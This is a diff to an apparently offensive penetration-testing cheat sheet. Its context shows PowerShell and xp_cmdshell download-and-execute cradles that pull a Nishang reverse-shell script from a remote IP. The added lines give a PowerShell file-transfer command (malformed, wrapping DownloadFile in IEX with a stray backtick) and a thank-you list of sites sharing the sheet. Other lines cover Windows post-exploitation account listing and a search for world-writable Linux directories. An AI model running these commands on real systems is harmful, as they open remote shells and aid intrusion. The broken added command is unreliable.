@@ -450,6 +450,10 @@ powershell -nop -exec bypass IEX "(New-Object Net.WebClient).DownloadString('htt
 ```
 xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
 ```
+- File transfer with PowerShell:
+```
+powershell -c IEX(New-Object Net.WebClient).DownloadFile('http://server/path/to/file', 'nameforefile')`
+```
 Windows Post Exploitation Commands
 ----------------
 - WMIC USERACCOUNT LIST BRIEF
@@ -472,3 +476,11 @@ Writeable Directories
 # Linux
 - To find World Writeable Directories in Linux use the command:
 ```find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print```
+
+
+
+Thank you:
+----------------
+# Thanks to these people for including my cheatsheet on their site/page:
+- https://khaoticdev.net/cheatsheets/#ad
+- https://www.facebook.com/ncybersec/posts/1541830509321001
